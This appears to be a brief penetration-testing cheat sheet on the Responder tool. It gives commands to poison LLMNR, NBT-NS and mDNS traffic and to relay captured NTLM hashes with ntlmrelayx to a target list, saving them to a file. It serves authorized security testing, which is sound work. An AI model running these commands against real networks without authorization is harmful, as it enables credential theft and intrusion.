# Responder

Responder is an LLMNR, NBT-NS and MDNS poisoner. Easy footholds on nearly every internal pentest.

## Installation 

Install Responder using git: 

```git clone https://github.com/lgandx/Responder```

## Usage

Basic Usage \
```./Responder.py -I [INTERFACE] -dwP```

Relay hashes obtained \
```./Responder.py -I [INTERFACE] -dwP``` \
```python ntlmrelayx.py -tf targets.txt```

We can also save the hashes being relayed so they aren't yeeted into the void \
```python ntlmrelay.py -tf targets.txt -of NTLMOutput.txt```

## References
* [Laurent Gaiffé Blog](https://g-laurent.blogspot.com/2021/08/responders-dhcp-poisoner.html)
* [Practical guide to NTLM Relaying](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
